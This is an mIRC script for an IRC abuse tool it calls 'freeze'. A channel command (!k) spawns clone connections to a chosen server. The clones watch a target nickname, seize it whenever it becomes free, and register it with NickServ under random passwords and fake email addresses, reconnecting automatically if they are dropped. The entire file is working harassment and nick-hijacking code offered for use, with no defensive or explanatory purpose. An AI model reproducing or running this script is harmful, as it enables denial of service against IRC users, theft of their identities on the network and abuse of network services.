on *:TEXT:*:#:{
  if (!k = $1) {
    if ($2 = $null) { shows [FREEZE] !freeze <server> <port> <nickname> | return }
    if (off = $2) { sockclose freeze | shows [FREEZE] all clones were killed. | return }
    %freeze.nick = $4
    sockopen $+(freeze,$r(1,9999)) $2 $3
    shows [FREEZE] loading clones to $2 $+ : $+ $3 
  }
}
alias freeze { sockwrite -n $1 NICK %freeze.nick }
on *:SOCKOPEN:freeze*:{
  if $sockerr { return }
  %xtemp = Guest $+ $r(1,9999)
  sockwrite -n $sockname USER %xtemp * * : $+ %xtemp
  sockwrite -n $sockname NICK %xtemp 
}
on *:SOCKREAD:freeze*:{
  sockread %kkill
  tokenize 32 %kkill
  if ($1 = PING) { sockwrite -n $sockname PONG $2- }
  if ($2 = 432) { sockclose $sockname }
  if ($2 = 601) { sockwrite -n $sockname NICK $4 }
  if ($2 = 605) { sockwrite -n $sockname NICK $4 }
  if ($2 = 376) {
    sockwrite -n $sockname MODE $3 +iR
    sockwrite -n $sockname WATCH $+(+,%freeze.nick)
  }
  if ($1 = ERROR) { %sockname = $sockname | %ip = $sock($sockname).ip | %port = $sock($sockname).port | sockclose $sockname | sockopen %sockname %ip %port }
  if ($2 = NICK) && (%freeze.nick = $remove($3,:)) {
    sockwrite -n $sockname NICKSERV REGISTER $+($r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z)) $+($r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(a,z),$r(1,9999999),@hotmail.com)
    sockwrite -n $sockname NICK Guest $+ $r(1,9999)
  }
  if ($4 = 440) { .timerX $+ $sockname 1 1 freeze $sockname }
}
